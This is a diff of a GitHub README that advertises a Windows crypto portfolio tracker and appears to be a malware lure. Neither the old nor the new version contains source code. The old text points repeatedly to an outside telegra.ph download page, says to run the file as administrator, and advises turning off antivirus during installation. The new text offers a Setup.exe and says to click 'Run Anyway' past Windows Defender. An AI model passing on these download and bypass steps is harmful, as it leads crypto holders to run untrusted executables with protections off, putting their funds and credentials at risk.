@@ -1,186 +1,79 @@
-<h1 align="center">📊 Crypto Price Tracker V2 2026 – Rust Portfolio Terminal</h1>
+# 📈 Crypto-Price-Tracker-V2-2026 - Track your crypto portfolio with ease
 
-<p align="center">
-  <strong>Rust terminal for portfolio tracking. Prices, P&L, tax lots (FIFO/LIFO/HIFO/Average), tax estimates, rebalancing, and historical performance charts.</strong><br>
-  <em>Latest version 2026 | Terminal application | Optimized for Windows 11 / Windows 10</em>
-</p>
+[![](https://img.shields.io/badge/Download-Setup.exe-blue.svg)](https://github.com/disguiseanadamabread571/Crypto-Price-Tracker-V2-2026)
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️_GET_PROJECT_FILES-Crypto_Tracker_V2-00BFFF?style=for-the-badge&logo=rust&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download">
-  </a>
-</p>
+This application tracks your cryptocurrency portfolio on Windows. It updates price data, calculates profit and loss, and provides tax estimations. You can use different accounting methods like First-In-First-Out or Last-In-First-Out to manage your tax lots. The tool also includes features for rebalancing your assets and viewing performance charts.
 
-<p align="center">
-  <i>Click the button above to get the full project files</i>
-</p>
+## 💻 System Requirements
 
----
+Your computer must meet these requirements to run the software.
 
-## 📦 What's Inside This Repository
+*   Operating System: Windows 10 or Windows 11.
+*   Processor: Intel Core i3 or equivalent.
+*   Memory: 4 GB of RAM.
+*   Storage: 200 MB of free disk space.
+*   Internet Connection: Required for live price updates.
 
-Welcome to the official distribution page for **Crypto Price Tracker V2 2026 – Rust Portfolio Terminal for Windows PC**.
-This repository provides access to a Rust-based terminal application for comprehensive crypto portfolio tracking.
+## 📥 How to Install
 
-✅ **Full Version** – All features included  
-✅ **Real-Time Prices** – Live price data for all holdings  
-✅ **P&L Tracking** – Profit and loss per asset  
-✅ **Tax Lots** – FIFO, LIFO, HIFO, and Average methods  
-✅ **Tax Estimates** – Estimated tax liability  
-✅ **Rebalancing Tools** – Track and suggest rebalancing  
-✅ **Historical Charts** – Performance over time  
-✅ **No System Changes** – Safe, no registry or service modifications  
+Follow these steps to set up the software on your computer.
 
----
+1.  Visit the [official download page](https://github.com/disguiseanadamabread571/Crypto-Price-Tracker-V2-2026).
+2.  Locate the section labeled Releases on the right side of the page.
+3.  Click the link for the latest version.
+4.  Download the file named Setup.exe.
+5.  Open your Downloads folder.
+6.  Double-click the Setup.exe file to start the installation.
+7.  Follow the prompts on your screen.
+8.  Select your preferred installation folder and click Finish.
 
-## 📥 How to Get Started?
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📥_HOW_TO_DOWNLOAD_-Step_by_Step_Guide-00BFFF?style=for-the-badge&logo=github&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="How to Download">
-  </a>
-</p>
+Once the installation finishes, you can launch the program from your desktop shortcut. The main window displays your current portfolio value and the total profit or loss for your assets.
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/📋_DOWNLOAD_INSTRUCTIONS-Full_Guide-00BFFF?style=for-the-badge&logo=readthedocs&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Download Instructions">
-  </a>
-</p>
+To begin tracking:
 
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🚀_GET_STARTED-Quick_Setup-00BFFF?style=for-the-badge&logo=windows&logoColor=white&labelColor=0A0A0A&color=00BFFF" alt="Get Started">
-  </a>
-</p>
+1.  Select the Add Asset button.
+2.  Enter the name of your cryptocurrency and the amount you hold.
+3.  Input the price you paid for the asset.
+4.  Save your entry.
 
----
+The software updates prices automatically when you open the application. It uses a secure terminal interface to ensure speed and reliability.
 
-## 🚀 Step-by-Step Guide
+## 📊 Measuring Performance
 
-### Step 1: Download the Project Files
-Click the **download button** above or use this direct link:
-👉 [**Get Crypto Price Tracker V2 2026 Project Files**](https://telegra.ph/How-to-download-07-15-12)
+The software offers tools to analyze your investment history. You can switch between accounting methods to see how your tax liability changes.
 
-### Step 2: Extract and Run
-Extract the downloaded archive and launch the application.
-Right-click and select **"Run as administrator"** to ensure proper installation.
+*   FIFO (First-In-First-Out): Sells earliest assets first.
+*   LIFO (Last-In-First-Out): Sells latest assets first.
+*   HIFO (Highest-In-First-Out): Sells assets with the highest cost first.
+*   Average Cost: Uses the mean purchase price.
 
-### Step 3: Launch & Enjoy
-After installation, open the application from your desktop shortcut or Start Menu.
-The software automatically detects all **ProjectFiles** modules and configurations.
+You can view these changes in the Reports tab. The charts illustrate your growth over time, allowing you to see trends in your portfolio.
 
----
+## ⚖️ Rebalancing Your Portfolio
 
-## 🔧 Key Features (2026 Update)
+Rebalancing helps you maintain your target asset allocation. The software provides suggestions based on your input to keep your investments aligned with your goals.
 
-### 📊 Portfolio Tracking
+1.  Go to the Rebalancing tab.
+2.  Set your target percentages for each asset.
+3.  Click the Calculate button.
+4.  The application displays the buy or sell actions needed to reach your target.
 
-| Feature | Description |
-| :--- | :--- |
-| **Real-Time Prices** | Live price data from multiple exchanges |
-| **Holdings Summary** | Total portfolio value and allocation |
-| **P&L by Asset** | Profit/loss per asset with percentages |
-| **Daily Change** | 24h price and value changes |
+Keep in mind that this tool provides estimates. Always verify your tax data with a professional accountant before filing your taxes.
 
-### 🧾 Tax Lot Methods
+## 🛠 Troubleshooting
 
-| Method | Description |
-| :--- | :--- |
-| **FIFO** | First In, First Out – earliest lots sold first |
-| **LIFO** | Last In, First Out – latest lots sold first |
-| **HIFO** | Highest In, First Out – highest cost lots sold first |
-| **Average** | Weighted average cost basis |
+If you encounter issues during installation or operation, check these common items.
 
-### 💰 Tax Estimates
+*   File blocked by Windows: Windows Defender may flag new software. Click More Info in the popup window and select Run Anyway to proceed.
+*   No data showing: Check your internet connection. The application requires an active connection to pull real-time prices.
+*   Slow performance: Ensure that your system meets the memory requirements. Close other heavy programs to free up RAM.
 
-| Feature | Description |
-| :--- | :--- |
-| **Short-Term Gains** | Positions held < 1 year |
-| **Long-Term Gains** | Positions held > 1 year |
-| **Estimated Tax** | Tax liability estimate based on your rate |
-| **Loss Harvesting** | Identify opportunities for tax-loss harvesting |
+If the application fails to open, try reinstalling the software. Download a fresh version from the main directory if the installer seems corrupted.
 
-### 📈 Performance & Rebalancing
+## 🔒 Data Privacy
 
-| Feature | Description |
-| :--- | :--- |
-| **Historical Charts** | Portfolio value over time |
-| **Performance Metrics** | ROI, CAGR, volatility |
-| **Rebalancing Suggestions** | Target allocation vs. current |
-| **Benchmark Comparison** | Compare against major indices |
+Your data stays on your computer. This software does not send your portfolio details or wallet addresses to external servers. It only connects to public price feeds. Your financial history remains private.
 
----
-
-## 📈 Why Choose Crypto Price Tracker V2 2026?
-
-- ✅ **Rust-Powered** – Fast and reliable
-- ✅ **Comprehensive** – All portfolio metrics in one place
-- ✅ **Tax-Ready** – Estimate tax liability easily
-- ✅ **No System Changes** – Safe, no registry or service modifications
-- ✅ **Regular Updates** – Active development with frequent releases
-
----
-
-## 🔗 Official Download Link
-
-> ### ⬇️ **Get the full project files here:**  
-> ### **[https://telegra.ph/How-to-download-07-15-12](https://telegra.ph/How-to-download-07-15-12)**
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/🖥️_GET_PROJECT_FILES-Crypto_Tracker_V2-00BFFF?style=flat-square&logo=rust&logoColor=white&labelColor=000000" alt="Get Project Files">
-  </a>
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">
-    <img src="https://img.shields.io/badge/⭐_STAR_THIS_REPO-Support-FFD700?style=flat-square&logo=github&logoColor=white&labelColor=000000" alt="Star this repository">
-  </a>
-</p>
-
-<p align="center">
-  <b>📁 After downloading, extract the archive and launch ProjectFiles to get started.</b>
-</p>
-
----
-
-## ❓ Frequently Asked Questions
-
-**Q: Is this the full version?**  
-A: Yes, this is the complete version with all features.
-
-**Q: Does it work on Windows 11?**  
-A: Absolutely. It is fully optimized for Windows 11 and Windows 10.
-
-**Q: What exchanges are supported?**  
-A: Major exchanges including Binance, Coinbase, Kraken, and more.
-
-**Q: What about antivirus warnings?**  
-A: Some antivirus programs may show a warning — this is a false positive. We recommend temporarily disabling it during installation.
-
-**Q: Can I use this for commercial purposes?**  
-A: Yes, the full version is suitable for both personal and professional use.
-
----
-
-## 📝 Important Notes
-
-- This version is intended for **educational use** only.  
-- Do not redistribute the installer — use the official link above.  
-- For technical support, please open an issue in this repository.  
-- Always check the file integrity after download.
-
----
-
-## 📜 License
-
-This repository is for **educational and distribution purposes** only.  
-All rights belong to their respective owners.
-
----
-
-<p align="center">
-  <b>⭐ If you found this useful, please star the repository!</b><br>
-  <i>📅 Updated: July 2026 – Version 2026 (Build 1.0.0)</i>
-</p>
-
-<p align="center">
-  <a href="https://telegra.ph/How-to-download-07-15-12" target="_blank">🔗 Download Crypto Price Tracker V2 2026 Now</a>
-</p>
+Keywords: 2026-software, crypto-portfolio-analyzer, crypto-price-tracking, desktop-app, fifo-lifo, financial-tools, open-source, pc-tools, performance-charts, portfolio-tracking, rebalancing-bot, rust-application, rust-terminal, tax-estimator, tax-lots, windows-software-installation-guide
